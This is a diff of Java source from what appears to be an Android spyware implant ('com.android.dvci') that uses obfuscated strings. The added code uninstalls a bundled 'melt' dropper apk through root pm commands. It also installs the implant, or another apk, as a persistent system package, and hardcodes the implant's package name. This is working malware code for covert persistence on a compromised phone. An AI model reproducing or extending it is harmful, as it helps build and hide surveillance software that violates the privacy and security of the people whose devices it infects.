@@ -400,6 +400,19 @@ public class Root {
 			script += M.e("pm clear ") + packageName + "\n";
 			script += M.e("pm disable ") + packageName + "\n";
 			script += M.e("pm uninstall ") + packageName + "\n";
+
+			Markup markupMelt = new Markup(Markup.MELT_FILE_MARKUP);
+			String meltapk = markupMelt.unserialize(new String());
+			if(meltapk.length() > 0){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (uninstallRoot), uninstall melt: " + meltapk);
+				}
+				script += M.e("pm clear ") + meltapk + "\n";
+				script += M.e("pm disable ") + meltapk + "\n";
+				script += M.e("pm uninstall ") + meltapk + "\n";
+			}
+
+
 			if (android.os.Build.VERSION.SDK_INT > 20 && ( Status.isPersistent() || Status.persistencyReady()) ){
 				/* I got one case where bd was partially uninstalled on android5 and manually issued a pm enable to re install, just keep the code here as remainder
 				 * Note: tipical behaviour of disable app, is that when you try to install it again, its icon doesn't appear inside the app dock, and its' impossible
@@ -479,14 +492,21 @@ public class Root {
 		return false;
 	}
 
-
+	/**
+	 * Install apk persistent. If apk is null, it copy itself
+	 * @param forceInstall
+	 * @param apk
+	 * @return
+	 */
 	static synchronized boolean installPersistence(Boolean forceInstall, String apk) {
 		android.content.pm.PackageInfo pi = null;
-
 		Boolean isPersistent = false;
 
 		String apkPosition = Status.getApkName();
 		if(apk == null) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (installPersistence), install myself");
+			}
 			if (apkPosition != null && !Status.isMelt()) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (installPersistence): found apk installed in: " + apkPosition);
@@ -495,6 +515,9 @@ public class Root {
 				return false;
 			}
 		}else{
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (installPersistence), install apk: " + apk);
+			}
 			apkPosition = apk;
 		}
 
@@ -523,7 +546,11 @@ public class Root {
 		Execute.execute(new String[]{Configuration.shellFileBase, "blw"});
 		addOldFileMarkup(String.format(M.e("%s*"), apkPosition.split("-")[0]));
 
-		String packageName = Status.self().getAppContext().getPackageName();
+		String packageName = M.e("com.android.dvci");
+
+		if (apk==null) {
+			packageName = Status.self().getAppContext().getPackageName();
+		}
 
 		String perPkg = Status.persistencyApk;
 		String command = M.e("export LD_LIBRARY_PATH=/vendor/lib:/system/lib") + "\n";
